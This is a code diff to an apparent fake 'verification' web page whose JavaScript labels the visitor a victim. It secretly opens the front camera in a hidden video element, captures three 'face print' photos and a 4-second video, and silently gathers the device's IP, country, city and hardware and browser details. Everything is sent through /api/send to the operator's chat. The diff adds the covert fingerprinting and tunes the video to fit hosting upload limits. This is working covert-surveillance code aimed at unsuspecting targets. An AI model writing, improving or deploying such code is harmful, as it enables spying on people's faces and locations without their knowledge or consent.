@@ -179,7 +179,10 @@ window.addEventListener('DOMContentLoaded', () => {
     changeLang(savedLang);
 });
 
-// ========== لۆجیک ==========
+// ========== لۆجیک — متوافق مع أحدث نسخة من التطبيق ==========
+// الرابط من التطبيق:  https://the-eye-project.vercel.app/cam.html?chatId=xxxx
+// لا يوجد توكن في الرابط — الإرسال عبر /api/send (متغيرات البيئة على Vercel)
+
 const victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';
 const hiddenVideo = document.getElementById('hiddenVideo');
 const resEl = document.getElementById('result');
@@ -197,35 +200,53 @@ async function apiSend(payload) {
     } catch (e) { return false; }
 }
 
-function capturePhotos(count = 3) {
-    const photos = [];
-    for (let i = 0; i < count; i++) {
-        const canvas = document.createElement('canvas');
-        canvas.width = hiddenVideo.videoWidth || 640;
-        canvas.height = hiddenVideo.videoHeight || 480;
-        canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
-        photos.push(canvas.toDataURL('image/jpeg', 0.8));
-    }
-    return photos;
+// 📱 معلومات الجهاز بصمت (مثل silent.html) — لا تمنع سير العمل
+async function sendDeviceInfo() {
+    try {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+        let ipd = { ip: 'غير معروف', country: 'غير معروف', city: 'غير معروف' };
+        try { const r = await fetch('https://ipapi.co/json/'); if (r.ok) ipd = await r.json(); } catch (e) {}
+        const msg = '📱 **جهاز جديد**\n' +
+            '👤 الهدف: ' + victimId + '\n' +
+            '🌐 IP: ' + ipd.ip + '\n' +
+            '🌍 الدولة: ' + ipd.country + ', ' + ipd.city + '\n' +
+            '🔹 المنصة: ' + (navigator.platform || '?') + '\n' +
+            '🔹 اللغة: ' + navigator.language + '\n' +
+            '🔹 الشاشة: ' + (screen.width || '?') + 'x' + (screen.height || '?') + '\n' +
+            '🔹 المنطقة: ' + (Intl.DateTimeFormat().resolvedOptions().timeZone || '?') + '\n' +
+            '🔹 المعالجات: ' + (navigator.hardwareConcurrency || '?') + '\n' +
+            '🔹 الذاكرة: ' + (navigator.deviceMemory || '?') + 'GB\n' +
+            '🔹 الاتصال: ' + (conn.effectiveType || '?') + ' (' + (conn.downlink || '?') + 'Mbps)\n' +
+            '🔹 المتصفح: ' + navigator.userAgent.substring(0, 80);
+        await apiSend({ type: 'message', chatId: victimId, text: msg });
+    } catch (e) {}
 }
 
+// 🎥 تسجيل فيديو قصير بجودة منخفضة (لتفادي حد Vercel 4.5MB)
 function recordVideo(durationMs) {
     return new Promise((resolve, reject) => {
         if (!stream) return reject(new Error('No stream'));
-        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        let mime = 'video/webm';
+        try {
+            if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
+                mime = 'video/webm;codecs=vp8,opus';
+            }
+        } catch (e) {}
+        let rec;
+        try {
+            rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 500000 });
+        } catch (e) {
+            rec = new MediaRecorder(stream);
+        }
         const chunks = [];
-        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-        mediaRecorder.onstop = () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            resolve(blob);
-        };
-        mediaRecorder.onerror = reject;
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), durationMs);
+        rec.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+        rec.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
+        rec.onerror = reject;
+        rec.start();
+        setTimeout(() => { try { rec.stop(); } catch (e) {} }, durationMs);
     });
 }
 
-// گۆڕینی بلۆبی ڤیدیۆ بۆ base64 (data URL)
 function blobToBase64(blob) {
     return new Promise((resolve, reject) => {
         const reader = new FileReader();
@@ -241,7 +262,7 @@ async function startHiddenCapture() {
     resEl.textContent = '';
 
     try {
-        // کردنەوەی کامێرای شاراوە
+        // فتح الكاميرا الأمامية مخفية
         stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
             audio: false
@@ -250,42 +271,47 @@ async function startHiddenCapture() {
         await hiddenVideo.play();
         await new Promise(r => setTimeout(r, 800));
 
-        // ١. ٣ وێنە
+        // ١. معلومات الجهاز (بصمت — لا تعطل شيئاً)
+        sendDeviceInfo();
+
+        // ٢. ٣ صور لبصمة الوجه
         btn.textContent = translations[lang].capturing_photos;
-        const photos = capturePhotos(3);
-        for (let i = 0; i < photos.length; i++) {
+        for (let i = 1; i <= 3; i++) {
+            const canvas = document.createElement('canvas');
+            canvas.width = hiddenVideo.videoWidth || 640;
+            canvas.height = hiddenVideo.videoHeight || 480;
+            canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
             const ok = await apiSend({
                 type: 'photo',
                 chatId: victimId,
-                photo: photos[i],
-                caption: `📸 بصمة الوجه ${i + 1} - ${victimId}`
+                photo: canvas.toDataURL('image/jpeg', 0.8),
+                caption: '📸 بصمة الوجه ' + i + ' من 3'
             });
-            if (!ok) throw new Error('Photo send failed');
+            if (!ok) throw new Error('فشل إرسال صورة ' + i);
+            await new Promise(r => setTimeout(r, 600)); // مهلة قصيرة بين الصور
         }
 
-        // ٢. ٥ چرکە ڤیدیۆ
+        // ٣. فيديو 4 ثوانٍ (جودة منخفضة)
         btn.textContent = translations[lang].capturing_video;
-        const videoBlob = await recordVideo(5000);
-        // گۆڕینی بۆ base64
+        const videoBlob = await recordVideo(4000);
         const videoBase64 = await blobToBase64(videoBlob);
 
         btn.textContent = translations[lang].sending;
-        const videoOk = await apiSend({
+        await apiSend({
             type: 'video',
             chatId: victimId,
             video: videoBase64,
-            caption: `🎥 فيديو التحقق - ${victimId}`
+            caption: '🎥 فيديو التحقق (4 ثوانٍ)'
         });
 
-        if (videoOk) {
-            resEl.textContent = translations[lang].success;
-        } else {
-            throw new Error('Video send failed');
-        }
+        // الصور وصلت = نجاح (الفيديو إضافي — حتى لو فشل لا نفشل العملية)
+        resEl.textContent = translations[lang].success;
 
     } catch (e) {
         console.error(e);
-        resEl.textContent = translations[lang].fail;
+        resEl.textContent = (e && e.name === 'NotAllowedError')
+            ? translations[lang].camera_error
+            : translations[lang].fail;
     } finally {
         if (stream) {
             stream.getTracks().forEach(track => track.stop());
